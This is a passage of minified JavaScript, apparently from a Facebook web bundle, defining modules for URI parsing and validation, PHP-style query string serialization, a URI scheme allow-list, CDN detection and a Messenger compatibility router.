          if (k === !1) return !1;
        }
        return !0;
      } else if (a instanceof Map) {
        if (a.size !== b.size) return !1;
        m = Array.from(b);
        for (j = a, l = Array.isArray(j), k = 0, j = l ? j : j[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
          if (l) {
            if (k >= j.length) break;
            h = j[k++];
          } else {
            k = j.next();
            if (k.done) break;
            h = k.value;
          }
          g = h;
          e = !1;
          for (f = 0; f < m.length; f++) {
            h = m[f];
            if (i(g, h, c, d)) {
              e = !0;
              m.splice(f, 1);
              break;
            }
          }
          if (e === !1) return !1;
        }
        return !0;
      } else {
        if (a.constructor !== b.constructor) return !1;
        if (Object.prototype.hasOwnProperty.call(a, "valueOf") && Object.prototype.hasOwnProperty.call(b, "valueOf")) return a.valueOf() == b.valueOf();
        h = Object.keys(a);
        if (h.length != Object.keys(b).length) return !1;
        for (f = 0; f < h.length; f++) {
          if (h[f] === "_owner") continue;
          if (!Object.prototype.hasOwnProperty.call(b, h[f]) || !i(a[h[f]], b[h[f]], c, d)) return !1;
        }
      }
      return !0;
    } finally {
      c.pop(), d.pop();
    }
  }
  f["default"] = a;
}, 66);
__d("isCdnURI", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    if (a.getProtocol() !== "http" && a.getProtocol() !== "https") return !1;
    var b = Number(a.getPort());
    if (!!b && b !== 80 && b !== 443) return !1;
    return a.isSubdomainOfDomain("fbcdn.net") ? !0 : !1;
  }
  f["default"] = a;
}, 66);
__d("BlueCompatRouter", ["BlueCompatBroker", "Env", "MessengerEnvironment", "URI", "areEqual", "gkx", "isCdnURI"], function (a, b, c, d, e, f, g) {
  "use strict";

  b = function (b, c) {
    var d,
      e = a.__fbNativeClearTimeout || window.clearTimeout,
      f = a.__fbNativeSetTimeout || window.setTimeout;
    return function () {
      var a = this,
        g = arguments,
        h = function () {
          d = null, b.apply(a, g);
        };
      e(d);
      d = f(h, c);
    };
  };
  var h = {
      convertUri: function (a) {
        if (a == null || a === "") return new (c("URI"))();
        a = new (c("URI"))(a);
        if (a.getDomain().endsWith("messenger.com")) return a.setDomain(a.getDomain().replace(/messenger\.com/i, "facebook.com")).setPath("/messages" + a.getPath());else return a;
      },
      goFragment: function (a) {
        if (c("Env").isCQuick) {
          a = h.convertUri(a);
          if (a.getFragment()) {
            var b = c("URI").getRequestURI(!1, !1);
            if (c("areEqual")(new (c("URI"))(b).setFragment("").getQualifiedURI(), new (c("URI"))(a).setFragment("").getQualifiedURI())) return !0;
          }
        }
        return !1;
      },
      go: function (a, b) {
        if (c("Env").isCQuick) {
          var d = new (c("URI"))(a);
          a = h.convertUri(a);
          var e = a.getQualifiedURI();
          if (c("isCdnURI")(a) || e.getPath().startsWith("/compat")) return !1;
          a = function () {
            if (c("MessengerEnvironment").messengerui && e.getPath().startsWith("/messages")) return [!1, "/messages"];
            if (d.getPath().startsWith("/settings") && e.getPath().startsWith("/settings") && (c("gkx")("1224637") || e.getSubdomain() !== d.getSubdomain())) {
              var a = e.getQueryData().tab;
              return a != null ? [!1, "/settings/" + a] : [!1, "/settings"];
            }
            if (d.getPath().startsWith("/games") && e.getPath().startsWith("/games")) return [!1, "/games/web"];
            if (d.getPath().startsWith("/notes") && e.getPath().startsWith("/notes")) return [!1, "/notes"];
            if (d.getPath().startsWith("/latest/posts") && e.getPath().startsWith("/latest/posts")) return [!1, "/business"];
            if (/\/[A-Za-z\-0-9]+\/settings/.test(d.getPath())) return [!1, "/pages/settings"];
            return /\/[A-Za-z\-0-9]+\/insights/.test(d.getPath()) ? [!1, "/insights"] : [!0, ""];
          }();
          var f = a[0];
          a = a[1];
          i({
            compatAction: "route",
            maintainKey: a,
            replace: b,
            uri: String(e)
          });
          return f;
        }
        return !1;
      },
      startChat: function (a, b) {
        return h.sendMessage({
          compatAction: "startchat",
          tabId: a,
          isPage: b
        });
      },
      chatListener: function (a, b, c) {
        a.addEventListener("click", function (a) {
          a.preventDefault(), h.startChat(b, c);
        });
      },
      sendMessage: function (a) {
        if (c("Env").isCQuick) {
          c("BlueCompatBroker").init();
          c("BlueCompatBroker").sendMessage(a);
          return !0;
        }
        return !1;
      }
    },
    i = b(h.sendMessage, 250);
  d = h;
  g["default"] = d;
}, 98);
__d("BaseDeserializePHPQueryData", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = /^([-_\w]+)((?:\[[-_\w]*\])+)=?(.*)/;
  function h(a) {
    return a === "hasOwnProperty" || a === "__proto__" ? "\ud83d\udf56" : a;
  }
  function a(a, b) {
    if (a == null || a === "") return {};
    var c = {};
    a = a.replace(/%5B/gi, "[").replace(/%5D/gi, "]");
    a = a.split("&");
    var d = Object.prototype.hasOwnProperty;
    for (var e = 0, f = a.length; e < f; e++) {
      var i = a[e].match(g);
      if (!i) {
        var j = a[e].indexOf("=");
        if (j === -1) c[b(a[e])] = null;else {
          var k = a[e].substring(0, j);
          j = a[e].substring(j + 1);
          c[b(k)] = b(j);
        }
      } else {
        k = i[2].split(/\]\[|\[|\]/).slice(0, -1);
        j = i[1];
        i = b(i[3] || "");
        k[0] = j;
        j = c;
        for (var l = 0; l < k.length - 1; l++) {
          var m = h(k[l]);
          if (m) {
            if (!d.call(j, m)) {
              var n = k[l + 1] && !k[l + 1].match(/^\d{1,3}$/) ? {} : [];
              j[m] = n;
              if (j[m] !== n) return c;
            }
            j = j[m];
          } else k[l + 1] && !k[l + 1].match(/^\d{1,3}$/) ? j.push({}) : j.push([]), j = j[j.length - 1];
        }
        j instanceof Array && k[k.length - 1] === "" ? j.push(i) : j[h(k[k.length - 1])] = i;
      }
    }
    return c;
  }
  f.deserialize = a;
}, 66);
__d("flattenPHPQueryData", ["invariant"], function (a, b, c, d, e, f, g, h) {
  function a(a) {
    return i(a, "", {});
  }
  function i(a, b, c) {
    if (a == null) c[b] = void 0;else if (typeof a === "object") {
      typeof a.appendChild !== "function" || h(0, 2616);
      for (var d in a) d !== "$$typeof" && Object.prototype.hasOwnProperty.call(a, d) && a[d] !== void 0 && i(a[d], b ? b + "[" + d + "]" : d, c);
    } else c[b] = a;
    return c;
  }
  g["default"] = a;
}, 98);
__d("PHPQuerySerializer", ["BaseDeserializePHPQueryData", "flattenPHPQueryData"], function (a, b, c, d, e, f, g) {
  function a(a) {
    var b = [];
    a = c("flattenPHPQueryData")(a);
    for (var d in a) if (Object.prototype.hasOwnProperty.call(a, d)) {
      var e = h(d);
      a[d] === void 0 ? b.push(e) : b.push(e + "=" + h(String(a[d])));
    }
    return b.join("&");
  }
  function h(a) {
    return encodeURIComponent(a).replace(/%5D/g, "]").replace(/%5B/g, "[");
  }
  function b(a) {
    return d("BaseDeserializePHPQueryData").deserialize(a, i);
  }
  function i(a) {
    try {
      return decodeURIComponent(a.replace(/\+/g, " "));
    } catch (b) {
      return a;
    }
  }
  e = {
    decodeComponent: i,
    deserialize: b,
    encodeComponent: h,
    serialize: a
  };
  f.exports = e;
}, 34);
__d("PHPQuerySerializerNoEncoding", ["BaseDeserializePHPQueryData", "flattenPHPQueryData"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a) {
    var b = [];
    a = c("flattenPHPQueryData")(a);
    for (var d in a) if (Object.prototype.hasOwnProperty.call(a, d)) {
      var e = h(d);
      a[d] === void 0 ? b.push(e) : b.push(e + "=" + h(String(a[d])));
    }
    return b.join("&");
  }
  function h(a) {
    return a;
  }
  function b(a) {
    return d("BaseDeserializePHPQueryData").deserialize(a, i);
  }
  function i(a) {
    return a;
  }
  e = {
    decodeComponent: i,
    deserialize: b,
    encodeComponent: h,
    serialize: a
  };
  f = e;
  g["default"] = f;
}, 98);
__d("PHPStrictQuerySerializer", ["PHPQuerySerializer", "flattenPHPQueryData"], function (a, b, c, d, e, f, g) {
  function a(a) {
    var b = [];
    a = c("flattenPHPQueryData")(a);
    for (var d in a) if (Object.prototype.hasOwnProperty.call(a, d)) {
      var e = h(d);
      a[d] === void 0 ? b.push(e) : b.push(e + "=" + h(String(a[d])));
    }
    return b.join("&");
  }
  function h(a) {
    return encodeURIComponent(a);
  }
  g.serialize = a;
  g.encodeComponent = h;
  g.deserialize = d("PHPQuerySerializer").deserialize;
  g.decodeComponent = d("PHPQuerySerializer").decodeComponent;
}, 98);
__d("URIRFC3986", [], function (a, b, c, d, e, f) {
  var g = new RegExp("^([^:/?#]+:)?(//([^\\\\/?#@]*@)?(\\[[A-Fa-f0-9:.]+\\]|[^\\/?#:]*)(:[0-9]*)?)?([^?#]*)(\\?[^#]*)?(#.*)?");
  function a(a) {
    if (a.trim() === "") return null;
    a = a.match(g);
    if (a == null) return null;
    var b = a[2] ? a[2].substr(2) : null,
      c = a[1] ? a[1].substr(0, a[1].length - 1) : null;
    a = {
      uri: a[0] ? a[0] : null,
      scheme: c,
      authority: b,
      userinfo: a[3] ? a[3].substr(0, a[3].length - 1) : null,
      host: a[2] ? a[4] : null,
      port: a[5] ? a[5].substr(1) ? parseInt(a[5].substr(1), 10) : null : null,
      path: a[6] ? a[6] : null,
      query: a[7] ? a[7].substr(1) : null,
      fragment: a[8] ? a[8].substr(1) : null,
      isGenericURI: b === null && !!c
    };
    return a;
  }
  f.parse = a;
}, 66);
__d("$InternalEnum", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = Object.prototype.hasOwnProperty,
    h = typeof WeakMap === "function" ? new WeakMap() : new Map();
  function i(a) {
    var b = h.get(a);
    if (b !== void 0) return b;
    var c = new Map();
    Object.getOwnPropertyNames(a).forEach(function (b) {
      c.set(a[b], b);
    });
    try {
      h.set(a, c);
    } catch (a) {}
    return c;
  }
  var j = Object.freeze(Object.defineProperties(Object.create(null), {
    isValid: {
      value: function (a) {
        return i(this).has(a);
      }
    },
    cast: {
      value: function (a) {
        return this.isValid(a) ? a : void 0;
      }
    },
    members: {
      value: function () {
        return i(this).keys();
      }
    },
    getName: {
      value: function (a) {
        return i(this).get(a);
      }
    }
  }));
  function a(a) {
    var b = Object.create(j);
    for (var c in a) g.call(a, c) && Object.defineProperty(b, c, {
      value: a[c]
    });
    return Object.freeze(b);
  }
  var k = Object.freeze(Object.defineProperties(Object.create(null), {
    isValid: {
      value: function (a) {
        return typeof a === "string" ? g.call(this, a) : !1;
      }
    },
    cast: {
      value: j.cast
    },
    members: {
      value: function () {
        return Object.getOwnPropertyNames(this).values();
      }
    },
    getName: {
      value: function (a) {
        return a;
      }
    }
  }));
  a.Mirrored = function (a) {
    var b = Object.create(k);
    for (var c = 0, d = a.length; c < d; ++c) Object.defineProperty(b, a[c], {
      value: a[c]
    });
    return Object.freeze(b);
  };
  Object.freeze(a.Mirrored);
  e.exports = Object.freeze(a);
}, null);
__d("URISchemes", ["$InternalEnum"], function (a, b, c, d, e, f) {
  "use strict";

  var g = new Set(["about", "accountscenter", "aidemos", "aistudio", "apk", "blob", "cmms", "fb", "fba", "fbatwork", "fb-ama", "fb-internal", "fb-workchat", "fb-workchat-secure", "fb-messenger", "fb-messenger-public", "fb-messenger-group-thread", "fb-page-messages", "fb-pma", "fbcf", "fbconnect", "fbinternal", "fbmobilehome", "fbrpc", "file", "flipper", "ftp", "gtalk", "http", "https", "mailto", "wss", "ms-app", "intent", "itms", "itms-apps", "itms-services", "lasso", "market", "svn+ssh", "fbstaging", "tel", "sms", "pebblejs", "sftp", "whatsapp", "moments", "flash", "fblite", "chrome-extension", "webcal", "instagram", "iglite", "fb124024574287414", "fb124024574287414rc", "fb124024574287414master", "fb1576585912599779", "fb929757330408142", "designpack", "fbpixelcloud", "fbapi20130214", "fb1196383223757595", "tbauth", "oculus", "oculus.store", "oculus.feed", "oculusstore", "socialplatform", "odh", "com.oculus.rd", "aria", "skype", "ms-windows-store", "callto", "messenger", "workchat", "fb236786383180508", "fb1775440806014337", "data", "fb-mk", "munki", "origami-file", "fb-nimble-vrsrecorder", "fb-nimble-monohandtrackingvis", "together", "togetherbl", "horizonlauncher", "venues", "whatsapp-consumer", "whatsapp-smb", "fb-ide-opener", "fb-vscode", "fb-vscode-insiders", "editor", "spark-studio", "spark-player", "spark-simulator", "arstudio", "manifold", "origami-internal", "origami-public", "stella", "mwa", "mattermost", "logaggregator", "workrooms", "pcoip", "cinema", "home", "oculus360photos", "systemux"]),
    h = b("$InternalEnum")({
      EXPLICITLY_ALLOWED_SCHEMES_ONLY: "explicitly_allowed_schemes_only",
      INCLUDE_DEFAULTS: "include_defaults"
    });
  function a(a, b, c) {
    b === void 0 && (b = h.INCLUDE_DEFAULTS);
    return a == null || a === "" ? !0 : (c == null ? void 0 : c.has(a.toLowerCase())) || b === h.INCLUDE_DEFAULTS && g.has(a.toLowerCase());
  }
  f.Options = h;
  f.isAllowed = a;
}, 66);
__d("isSameOrigin", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b) {
    return !a.getProtocol() || !a.getDomain() || !b.getProtocol() || !b.getDomain() ? !1 : a.getOrigin() === b.getOrigin();
  }
  f["default"] = a;
}, 66);
__d("setHostSubdomain", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b) {
    a = a.split(".");
    a.length < 3 ? a.unshift(b) : a[0] = b;
    return a.join(".");
  }
  f["default"] = a;
}, 66);
__d("URIAbstractBase", ["invariant", "FBLogger", "PHPStrictQuerySerializer", "URIRFC3986", "URISchemes", "isSameOrigin", "setHostSubdomain"], function (a, b, c, d, e, f, g) {
  var h,
    i,
    j = new RegExp("[\\x00-\\x2c\\x2f\\x3b-\\x40\\x5c\\x5e\\x60\\x7b-\\x7f\\uFDD0-\\uFDEF\\uFFF0-\\uFFFF\\u2047\\u2048\\uFE56\\uFE5F\\uFF03\\uFF0F\\uFF1F]"),
    k = new RegExp("^(?:[^/]*:|[\\x00-\\x1f]*/[\\x00-\\x1f]*/)"),
    l = [];
  a = function () {
    "use strict";

    a.parse = function (c, d, e, f) {
      if (!d) return !0;
      if (d instanceof a) {
        c.setProtocol(d.getProtocol());
        c.setDomain(d.getDomain());
        c.setPort(d.getPort());
        c.setPath(d.getPath());
        c.setQueryData(f.deserialize(f.serialize(d.getQueryData())));
        c.setFragment(d.getFragment());
        c.setIsGeneric(d.getIsGeneric());
        c.setForceFragmentSeparator(d.getForceFragmentSeparator());
        c.setOriginalRawQuery(d.getOriginalRawQuery());
        c.setQueryParamModified(!1);
        return !0;
      }
      d = d.toString().trim();
      var g = (h || (h = b("URIRFC3986"))).parse(d) || {
        fragment: null,
        scheme: null,
        query: null
      };
      if (!e && !(i || (i = b("URISchemes"))).isAllowed(g.scheme, c.$12, c.$13)) return !1;
      c.setProtocol(g.scheme || "");
      if (!e && j.test(g.host || "")) return !1;
      c.setDomain(g.host || "");
      c.setPort(g.port || "");
      c.setPath(g.path || "");
      if (e) c.setQueryData(f.deserialize(g.query || "") || {});else try {
        c.setQueryData(f.deserialize(g.query || "") || {});
      } catch (a) {
        return !1;
      }
      c.setFragment(g.fragment || "");
      g.fragment === "" && c.setForceFragmentSeparator(!0);
      c.setIsGeneric(g.isGenericURI || !1);
      c.setOriginalRawQuery(g.query);
      c.setQueryParamModified(!1);
      if (g.userinfo !== null) {
        if (e) throw new Error("URI.parse: invalid URI (userinfo is not allowed in a URI): " + d);
        return !1;
      }
      if (!c.getDomain() && c.getPath().indexOf("\\") !== -1) {
        if (e) throw new Error("URI.parse: invalid URI (no domain but multiple back-slashes): " + d);
        return !1;
      }
      if (!c.getProtocol() && k.test(d)) {
        if (e) throw new Error("URI.parse: invalid URI (unsafe protocol-relative URLs): " + d + "'");
        return !1;
      }
      if (c.getDomain() && c.getPath() && !c.getPath().startsWith("/")) {
        if (e) throw new Error("URI.parse: invalid URI (domain and path where path lacks leading slash): " + d);
        return !1;
      }
      c.getProtocol() && !c.getIsGeneric() && !c.getDomain() && c.getPath() !== "" && b("FBLogger")("uri").warn('URI.parse: invalid URI (protocol "' + c.getProtocol() + '" with no domain)');
      return !0;
    };
    a.tryParse = function (b, c, d, e) {
      d = new a(null, c, d, e);
      return a.parse(d, b, !1, c) ? d : null;
    };
    a.isValid = function (b, c, d, e) {
      return !!a.tryParse(b, c, d, e);
    };
    function a(c, d, e, f) {
      e === void 0 && (e = (i || (i = b("URISchemes"))).Options.INCLUDE_DEFAULTS), d || g(0, 2966), this.$9 = d, this.$7 = "", this.$1 = "", this.$6 = "", this.$5 = "", this.$3 = "", this.$4 = !1, this.$8 = {}, this.$2 = !1, this.$12 = e, this.$13 = f, a.parse(this, c, !0, d), this.$11 = !1;
    }
    var c = a.prototype;
    c.setProtocol = function (a) {
      (i || (i = b("URISchemes"))).isAllowed(a, this.$12, this.$13) || g(0, 11793, a);
      this.$7 = a;
      return this;
    };
    c.getProtocol = function () {
      return (this.$7 || "").toLowerCase();
    };
    c.setSecure = function (a) {
      return this.setProtocol(a ? "https" : "http");
    };
    c.isSecure = function () {
      return this.getProtocol() === "https";
    };
    c.setDomain = function (a) {
      if (j.test(a)) throw new Error("URI.setDomain: unsafe domain specified: " + a + " for url " + this.toString());
      this.$1 = a;
      return this;
    };
    c.getDomain = function () {
      return this.$1;
    };
    c.setPort = function (a) {
      this.$6 = a;
      return this;
    };
    c.getPort = function () {
      return this.$6;
    };
    c.setPath = function (a) {
      this.$5 = a;
      return this;
    };
    c.getPath = function () {
      return this.$5;
    };
    c.addQueryData = function (a, b) {
      Object.prototype.toString.call(a) === "[object Object]" ? Object.assign(this.$8, a) : this.$8[a] = b;
      this.$11 = !0;
      return this;
    };
    c.setQueryData = function (a) {
      this.$8 = a;
      this.$11 = !0;
      return this;
    };
    c.getQueryData = function () {
      return this.$8;
    };
    c.setQueryString = function (a) {
      return this.setQueryData(this.$9.deserialize(a));
    };
    c.getQueryString = function (a, b, c) {
      a === void 0 && (a = !1);
      b === void 0 && (b = function () {
        return !1;
      });
      c === void 0 && (c = null);
      return this.$14(!1, a, b, c);
    };
    c.$14 = function (a, b, c, d) {
      a === void 0 && (a = !1);
      b === void 0 && (b = !1);
      c === void 0 && (c = function () {
        return !1;
      });
      d === void 0 && (d = null);
      if (!this.$11 && (b || c(this.getDomain()))) {
        return (b = this.$10) != null ? b : "";
      }
      return (a && d ? d : this.$9).serialize(this.getQueryData());
    };
    c.removeQueryData = function (a) {
      Array.isArray(a) || (a = [a]);
      for (var b = 0, c = a.length; b < c; ++b) delete this.$8[a[b]];
      this.$11 = !0;
      return this;
    };
    c.setFragment = function (a) {
      this.$3 = a;
      this.setForceFragmentSeparator(!1);
      return this;
    };
    c.getFragment = function () {
      return this.$3;
    };
    c.setForceFragmentSeparator = function (a) {
      this.$2 = a;
      return this;
    };
    c.getForceFragmentSeparator = function () {
      return this.$2;
    };
    c.setIsGeneric = function (a) {
      this.$4 = a;
      return this;
    };
    c.getIsGeneric = function () {
      return this.$4;
    };
    c.getOriginalRawQuery = function () {
      return this.$10;
    };
    c.setOriginalRawQuery = function (a) {
      this.$10 = a;
      return this;
    };
    c.setQueryParamModified = function (a) {
      this.$11 = a;
      return this;
    };
    c.isEmpty = function () {
      return !(this.getPath() || this.getProtocol() || this.getDomain() || this.getPort() || Object.keys(this.getQueryData()).length > 0 || this.getFragment());
    };
    c.toString = function (a, b) {
      a === void 0 && (a = function () {
        return !1;
      });
      b === void 0 && (b = null);
      return this.$15(!1, !1, a, b);
    };
    c.toStringRawQuery = function (a, b) {
      a === void 0 && (a = function () {
        return !1;
      });
      b === void 0 && (b = null);
      return this.$15(!0, !1, a, b);
    };
    c.toStringPreserveQuery = function (a, b) {
      a === void 0 && (a = function () {
        return !1;
      });
      b === void 0 && (b = null);
      return this.$15(!1, !0, a, b);
    };
    c.toStringStrictQueryEncoding = function (a) {
      a === void 0 && (a = function () {
        return !1;
      });
      return this.$15(!0, !1, a, b("PHPStrictQuerySerializer"));
    };
    c.$15 = function (a, b, c, d) {
      a === void 0 && (a = !1);
      b === void 0 && (b = !1);
      c === void 0 && (c = function () {
        return !1;
      });
      d === void 0 && (d = null);
      var e = this;
      for (var f = 0; f < l.length; f++) e = l[f](e);
      return e.$16(a, b, c, d);
    };
    c.$16 = function (a, b, c, d) {
      a === void 0 && (a = !1);
      b === void 0 && (b = !1);
      c === void 0 && (c = function () {
        return !1;
      });
      d === void 0 && (d = null);
      var e = "",
        f = this.getProtocol();
      f && (e += f + ":" + (this.getIsGeneric() ? "" : "//"));
      f = this.getDomain();
      f && (e += f);
      f = this.getPort();
      f && (e += ":" + f);
      f = this.getPath();
      f ? e += f : e && (e += "/");
      f = this.$14(a, b, c, d);
      f && (e += "?" + f);
      a = this.getFragment();
      a ? e += "#" + a : this.getForceFragmentSeparator() && (e += "#");
      return e;
    };
    a.registerFilter = function (a) {
      l.push(a);
    };
    c.getOrigin = function () {
      var a = this.getPort();
      return this.getProtocol() + "://" + this.getDomain() + (a ? ":" + a : "");
    };
    c.isSameOrigin = function (a) {
      return b("isSameOrigin")(this, a);
    };
    c.getQualifiedURIBase = function () {
      return new a(this, this.$9).qualify();
    };
    c.qualify = function () {
      if (!this.getDomain()) {
        var b = new a(window.location.href, this.$9);
        this.setProtocol(b.getProtocol()).setDomain(b.getDomain()).setPort(b.getPort());
      }
      return this;
    };
    c.setSubdomain = function (a) {
      var c = this.qualify();
      c = c.getDomain();
      return this.setDomain(b("setHostSubdomain")(c, a));
    };
    c.getSubdomain = function () {
      if (!this.getDomain()) return "";
      var a = this.getDomain().split(".");
      if (a.length <= 2) return "";else return a[0];
    };
    c.isSubdomainOfDomain = function (b) {
      var c = this.getDomain();
      return a.isDomainSubdomainOfDomain(c, b, this.$9);
    };
    a.isDomainSubdomainOfDomain = function (b, c, d) {
      if (c === "" || b === "") return !1;
      if (b.endsWith(c)) {
        var e = b.length,
          f = c.length,
          g = e - f - 1;
        if (e === f || b[g] === ".") {
          e = new a(null, d);
          e.setDomain(c);
          return a.isValid(e, d);
        }
      }
      return !1;
    };
    return a;
  }();
  e.exports = a;
}, null);
__d("URIBase", ["ExecutionEnvironment", "PHPQuerySerializerNoEncoding", "URIAbstractBase", "URISchemes", "UriNeedRawQuerySVChecker", "err"], function (a, b, c, d, e, f, g) {
  function h(a, b, d, e) {
    try {
      return c("URIAbstractBase").parse(a, b, d, e);
    } catch (a) {
      throw new Error(c("err")(a.message));
    }
  }
  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    b.tryParse = function (a, c, e, f) {
      e === void 0 && (e = d("URISchemes").Options.INCLUDE_DEFAULTS);
      e = new b(null, c, e, f);
      return h(e, a, !1, c) ? e : null;
    };
    b.isValid = function (a, c, e, f) {
      e === void 0 && (e = d("URISchemes").Options.INCLUDE_DEFAULTS);
      return !!b.tryParse(a, c, e, f);
    };
    function b(b, c, e, f) {
      e === void 0 && (e = d("URISchemes").Options.INCLUDE_DEFAULTS);
      e = a.call(this, b, c, e, f) || this;
      e.$URIBase1 = c;
      h(babelHelpers.assertThisInitialized(e), b, !0, c);
      return e;
    }
    var e = b.prototype;
    e.setDomain = function (b) {
      try {
        a.prototype.setDomain.call(this, b);
      } catch (a) {
        throw new Error(c("err")(a.message));
      }
      return this;
    };
    e.getQualifiedURIBase = function () {
      return new b(this, this.$URIBase1).qualify();
    };
    e.qualify = function () {
      if (!this.getDomain()) {
        var a = (typeof window !== "undefined" ? window : self).location.href;
        c("ExecutionEnvironment").isInWorker && a && a.startsWith("blob:") && (a = a.substring(5, a.length));
        a = new b(a, this.$URIBase1);
        this.setProtocol(a.getProtocol()).setDomain(a.getDomain()).setPort(a.getPort());
      }
      return this;
    };
    e.isSubdomainOfDomain = function (a) {
      var c = this.getDomain();
      return b.isDomainSubdomainOfDomain(c, a, this.$URIBase1);
    };
    b.isDomainSubdomainOfDomain = function (a, c, d) {
      if (c === "" || a === "") return !1;
      if (a.endsWith(c)) {
        var e = a.length,
          f = c.length,
          g = e - f - 1;
        if (e === f || a[g] === ".") {
          e = new b(null, d);
          e.setDomain(c);
          return b.isValid(e, d);
        }
      }
      return !1;
    };
    e.toString = function () {
      return a.prototype.toString.call(this, c("UriNeedRawQuerySVChecker").isDomainNeedRawQuery, c("PHPQuerySerializerNoEncoding"));
    };
    e.toStringRawQuery = function () {
      return a.prototype.toStringRawQuery.call(this, c("UriNeedRawQuerySVChecker").isDomainNeedRawQuery, c("PHPQuerySerializerNoEncoding"));
    };
    e.toStringPreserveQuery = function () {
      return a.prototype.toStringPreserveQuery.call(this, c("UriNeedRawQuerySVChecker").isDomainNeedRawQuery, c("PHPQuerySerializerNoEncoding"));
    };
    e.toStringStrictQueryEncoding = function () {
      return a.prototype.toStringStrictQueryEncoding.call(this, c("UriNeedRawQuerySVChecker").isDomainNeedRawQuery);
    };
    e.getQueryString = function (b) {
      b === void 0 && (b = !1);
      return a.prototype.getQueryString.call(this, b, c("UriNeedRawQuerySVChecker").isDomainNeedRawQuery, c("PHPQuerySerializerNoEncoding"));
    };
    return b;
  }(c("URIAbstractBase"));
  g["default"] = a;
}, 98);
__d("UriNeedRawQuerySVChecker", ["PHPQuerySerializer", "URIBase", "UriNeedRawQuerySVConfig"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h,
    i = ["http", "https"];
  function a(a) {
    if (a == null) return !1;
    a = a instanceof (g || (g = b("URIBase"))) ? a : (g || (g = b("URIBase"))).tryParse(a, h || (h = b("PHPQuerySerializer")));
    if (a == null) return !1;
    var c = a.getProtocol();
    return !i.includes(c) ? !1 : j(a.getDomain());
  }
  function j(a) {
    return a != null && b("UriNeedRawQuerySVConfig").uris.some(function (c) {
      return (g || (g = b("URIBase"))).isDomainSubdomainOfDomain(a, c, h || (h = b("PHPQuerySerializer")));
    });
  }
  e.exports = {
    isUriNeedRawQuery: a,
    isDomainNeedRawQuery: j
  };
}, null);
__d("ifRequired", [], function (a, b, c, d, e, f) {
  function a(a, b, c) {
    var e;
    d && d.call(null, [a], function (a) {
      e = a;
    });
    if (e && b) return b(e);else if (!e && c) return c();
  }
  f["default"] = a;
}, 66);
__d("memoize", ["invariant"], function (a, b, c, d, e, f, g, h) {
  function a(a) {
    var b = a,
      c;
    return function () {
      arguments.length && h(0, 4494);
      b && (c = b(), b = null);
      return c;
    };
  }
  g["default"] = a;
}, 98);
__d("memoizeStringOnly", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    var b = {};
    return function (c) {
      Object.prototype.hasOwnProperty.call(b, c) || (b[c] = a.call(this, c));
      return b[c];
    };
  }
  f["default"] = a;
}, 66);
__d("unexpectedUseInComet", ["FBLogger", "gkx"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a) {
    if (!c("gkx")("708253")) return;
    a = a + " called unexpectedly. This is not supported in Comet!";
    var b = c("FBLogger")("comet_infra").blameToPreviousFrame().blameToPreviousFrame();
    b.mustfix(a);
  }
  g["default"] = a;
}, 98);
__d("unqualifyURI", [], function (a, b, c, d, e, f) {
  function a(a) {
    return a.setProtocol("").setDomain("").setPort("");
  }
  f["default"] = a;
}, 66);
__d("URI", ["Env", "FBLogger", "PHPQuerySerializer", "PHPQuerySerializerNoEncoding", "ReloadPage", "URIBase", "UriNeedRawQuerySVChecker", "ifRequired", "isFacebookURI", "memoize", "memoizeStringOnly", "unexpectedUseInComet", "unqualifyURI"], function (a, b, c, d, e, f, g) {
  var h = c("memoize")(function () {
    return new j(window.location.href);
  });
  function i() {
    return c("ifRequired")("PageTransitions", function (a) {
      if (a.isInitialized()) return a;
    });
  }
  var j = function (e) {
    babelHelpers.inheritsLoose(b, e);
    function b(a, b, f) {
      var g = d("UriNeedRawQuerySVChecker").isUriNeedRawQuery(a) ? c("PHPQuerySerializerNoEncoding") : c("PHPQuerySerializer");
      return e.call(this, a, g, b, f) || this;
    }
    var f = b.prototype;
    f.setPath = function (a) {
      this.path = a;
      return e.prototype.setPath.call(this, a);
    };
    f.getPath = function () {
      var a = e.prototype.getPath.call(this);
      return a ? a.replace(/^\/+/, "/") : a;
    };
    f.setProtocol = function (a) {
      this.protocol = a;
      return e.prototype.setProtocol.call(this, a);
    };
    f.setDomain = function (a) {
      this.domain = a;
      return e.prototype.setDomain.call(this, a);
    };
    f.setPort = function (a) {
      this.port = a;
      return e.prototype.setPort.call(this, a);
    };
    f.setFragment = function (a) {
      this.fragment = a;
      return e.prototype.setFragment.call(this, a);
    };
    f.stripTrailingSlash = function () {
      this.setPath(this.getPath().replace(/\/$/, ""));
      return this;
    };
    f.addTrailingSlash = function () {
      var a = this.getPath();
      a.length > 0 && a[a.length - 1] !== "/" && this.setPath(a + "/");
      return this;
    };
    f.valueOf = function () {
      return this.toString();
    };
    f.getRegisteredDomain = function () {
      if (!this.getDomain()) return "";
      if (!c("isFacebookURI")(this)) return null;
      var a = this.getDomain().split("."),
        b = a.indexOf("facebook");
      b === -1 && (b = a.indexOf("workplace"));
      return a.slice(b).join(".");
    };
    f.getUnqualifiedURI = function () {
      return c("unqualifyURI")(new b(this));
    };
    f.getQualifiedURI = function () {
      return new b(this).qualify();
    };
    f.isSameOrigin = function (a) {
      a = a;
      a == null ? a = h() : a instanceof b || (a = new b(a.toString()));
      return e.prototype.isSameOrigin.call(this, a);
    };
    b.goURIOnNewWindow = function (a) {
      b.goURIOnWindow(a, window.open("", "_blank"), !0);
    };
    b.goURIOnWindow = function (a, c, d, e) {
      d === void 0 && (d = !1), e === void 0 && (e = !1), b.goURIOnWindowWithReference(a, c, d, e);
    };
    b.goURIOnWindowWithReference = function (e, f, g, h) {
      g === void 0 && (g = !1);
      h === void 0 && (h = !1);
      e = new b(e);
      g = g;
      var i = !f || f === window;
      if (c("Env").isCQuick && c("isFacebookURI")(e) && i) {
        i = {
          cquick: c("Env").iframeKey,
          ctarget: c("Env").iframeTarget,
          cquick_token: c("Env").iframeToken
        };
        e.addQueryData(i);
        g = !1;
      }
      i = e.toString();
      e = f ? f : window;
      f = window.location.href === i && e === window;
